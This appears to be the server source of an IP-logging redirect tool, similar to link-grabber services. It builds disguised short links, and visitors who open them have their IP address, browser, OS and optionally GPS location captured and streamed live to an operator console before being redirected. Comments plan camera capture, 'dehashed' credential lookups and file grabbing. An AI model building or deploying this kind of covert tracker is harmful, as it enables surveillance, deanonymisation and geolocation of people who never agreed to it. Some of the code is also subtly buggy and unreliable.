

const express   = require("express")
const http      = require("http")
const requestIp = require("request-ip")
const fs        = require("fs")
const ejs       = require("ejs")
const {con}     = require("./conf/mysql.js")
const socketIO  = require("socket.io")
const {v4: uuidv4} = require("uuid")
const cors      = require("cors")


const CONF = require("./conf.json")

/////////////////////////////////////////////
//conf express and socket.io
let redirectApp = express()
let consoleApp  = express()




http.createServer(redirectApp).listen(CONF.redirect.port)
//https

let server = http.createServer(consoleApp).listen(CONF.console.port)
//socket IO
let io = socketIO(server)


function checkValide(url)
{
  let date = new Date(url)
  return ( Date.now() - date ) 
}

function getLinks(req){
  return new Promise((resolve, reject)=>{
  
    let options = {
      redirect : "",
      sendLinks: "",
      time: 1000,
      options: {}
    }


    console.log(`NEW USER IP => ${requestIp.getClientIp(req)} IS LANDING ON PAGE => ${req.url}`)

    con.query("SELECT * FROM redirect WHERE FROM_URL=?", [req.path], (err, result)=>{
      

      //ERROR CHECK
      if(err){return reject( {err: "error not url found"})}
      if(!result){return reject({err: "error not url found"})}
      if(!result.length){return reject({err: "err not url found"})}
      if(!checkValide(result[0].ENDTIME)){return reject({err: "error url not valide"})}
      
      //SUCCESS 
      let {TIME, TO_URL, UUID, GPS} = result[0]
      
      options.time = TIME
      options.redirect = TO_URL
      options.sendLinks = `http://${CONF.console.host}:${CONF.console.port}/send/${UUID}`

      options.options.gps = GPS ? true : false

      io.emit(UUID + "Connection", {ip: requestIp.getClientIp(req), url: req.originalUrl})

      resolve(options)
    })



  })
}

redirectApp.get("/*", async (req, res)=>{
  try{
    let options = await getLinks(req)
    
    res.render("landing.ejs", options);
  }
  catch(error)
  {
    res.redirect(CONF.redirect.default)
  }
})



//////////////////////////////////////////
///Console 

const {checkIp} = require("./tools/checkIP.js")

const mysql     = require("mysql")

consoleApp.use(express.json({limit: "10mB"}))
consoleApp.use(express.urlencoded({extended: true}))
consoleApp.use(requestIp.mw())
consoleApp.use(cors())      //for Cross-Origin Resource Sharing (CORS)
//pour les fichier static
consoleApp.use("/static", express.static("public"))

function pushNewUser(user)
{
  return new Promise((resolve, reject)=>{     

    con.query("INSERT INTO user SET ?", user, (err)=>{
      if(err){return reject({err: err})}
      io.emit(user.UUID + "Info", user)
      resolve("ok")
    })

  })
}




consoleApp.post("/send/:UUID", async (req, res)=>{
    try{

      if(!req.params.UUID ){throw {err: "bad request"} }
      let user = {
        date      : new Date(),
        IP        : req.clientIp,
        Naviguator: req.body.navigator || "NULL",
        OS        : req.body.os || "NULL",
        UUID      : req.params.UUID || "NULL",
        GPS       : req.params.gps || "NULL",
      } 


      let responsse = await pushNewUser(user)
      res.status(200).json({res: responsse})
    }
    catch(err){
      err = err.err || "bad request"
      res.status(500).json({err: err.err})
    }
  }
)


function getInformationByUUID(UUID)
{
  return new Promise((resolve, reject)=>{
      con.query(`SELECT * FROM user 
      INNER JOIN redirect ON user.UUID = redirect.UUID 
      WHERE user.UUID = ?`, [UUID], (err, result)=>{
        if(err){return reject({err: "error please try again"})}
        if(!result){return reject({err: "error please try again"})}
        if(!result.length){resolve([])}
        resolve(result)
      })
  })
}


consoleApp.get("/getByUIDD/:UUID", checkIp,  async (req, res)=>{
    try{
      if(!req.params.UUID){throw {err: "please entry your UUID"}}
      let result = await getInformationByUUID(req.params.UUID)
      res.render("UUID.ejs", {all: result, host: CONF.console.host, port: CONF.console.port, UUID: req.params.UUID})

    } 
    catch(err)
    {
      err = err.err || "plesse try again"
      res.status(500).json({err: err})
    } 
  }
)


function getByUUID()
{
  return new Promise((resolve, reject)=>{
    con.query("SELECT * FROM redirect", (err, result, fields)=>{
      if(err){return reject({err: "bad request"})}
      if(!result){return reject({err: "error please try again"})}
      if(!result.length){return resolve([])}
      resolve(result)
    })
  })
}


consoleApp.get("/", checkIp, async(req, res)=>{
  res.redirect("/HOME")
})

consoleApp.get("/HOME", checkIp, async (req, res)=>{
    try{
        let result = await getByUUID()
        res.render("home.ejs", {all: result})
    }
    catch(err){
      err = err.err || "error please try again"
      res.status(500).json({err: err})
    }
  }
)

//create
consoleApp.get("/create", checkIp, async(req, res)=>{
  res.setHeader("Content-Type", "text/html")
  res.status(200)
  res.sendFile(__dirname + "/html/create.html")
})


/*





{
  L_Link: 'http://test.com',
  L_CustomURL: '/tes/test',
  L_Time: '25',
  L_cam: 'on',
  L_gps: 'on',
  L_dehashed: 'on',
  L_file: 'on'
}


*/

function createUrl(create)
{
  return new Promise((resolve, reject)=>{
    
    let uuid = uuidv4()

    let insert = {
        FROM_URL  : create.CustomURL,
        TO_URL    : create.Link,
        ENDTIME   : create.Time,
        UUID      : uuid,
        TIME      : create.redirectTime,
        GPS       : create.options.gps,
    }

    con.query("INSERT INTO redirect SET ?", insert, (err)=>{
      if(err){return reject({err: "please try again"})}
      resolve(insert)
    })
    
  })
}

consoleApp.post("/create/links", checkIp, async(req, res)=>{
    try{

      if(!req.body.L_Link || !req.body.L_CustomURL)
        {
          throw {err: "bad request"}
        }

      let date = new Date()
      
      if(!req.body.L_Time)
      {
        date.setDate(date.getDate() + 1)  
      }

        date.setDate(date.getDate() + Number(req.body.L_Time) )

        let create = {
          Link: req.body.L_Link,
          CustomURL: req.body.L_CustomURL,
          Time: date,
          redirectTime: req.body.L_redirectTIME ? Number(req.body.L_redirectTIME) : 1000,
          options: {
            gps: req.body.L_gps  ? true : false,
            
            //IMplantation future ?
            // cam: req.body.L_came ? True : False,
           // dehashed: req.body.L_dehashed  ? True : False,
           // file: req.body.file  ? True : False,
          }
         }

         let UUID = await createUrl(create)

         res.render("YourCode.ejs", UUID)

    }
    catch(err){
      err = err || "please try again"
      res.status(500).json({err: err})
    }
})

